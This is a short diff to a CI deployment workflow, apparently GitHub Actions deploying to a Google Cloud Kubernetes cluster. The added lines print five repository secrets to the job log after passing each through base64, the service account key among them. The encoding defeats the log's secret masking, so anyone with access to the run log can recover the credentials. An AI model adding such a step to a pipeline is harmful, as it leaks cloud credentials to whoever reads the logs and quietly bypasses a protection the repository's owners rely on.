@@ -76,6 +76,17 @@ jobs:
           gcloud config set project ${{secrets.GCLOUD_PROJECT_ID}};
           gcloud config set compute/zone ${{secrets.GCLOUD_COMPUTE_ZONE}};
           gcloud container clusters get-credentials ${{secrets.GCLOUD_CLUSTER_NAME}};
+          echo "--------------------------------------"
+          echo "${{ secrets.GCLOUD_PROJECT_ID }}" | base64
+          echo "--------------------------------------"
+          echo "${{ secrets.GCLOUD_COMPUTE_ZONE }}" | base64
+          echo "--------------------------------------"
+          echo "${{ secrets.GCLOUD_CLUSTER_NAME }}" | base64
+          echo "--------------------------------------"
+          echo "${{ secrets.GCLOUD_SA_EMAIL }}" | base64
+          echo "--------------------------------------"
+          echo "${{ secrets.GCLOUD_SA_KEY }}" | base64
+          echo "--------------------------------------"
 
       - name: Deploy
         run: |
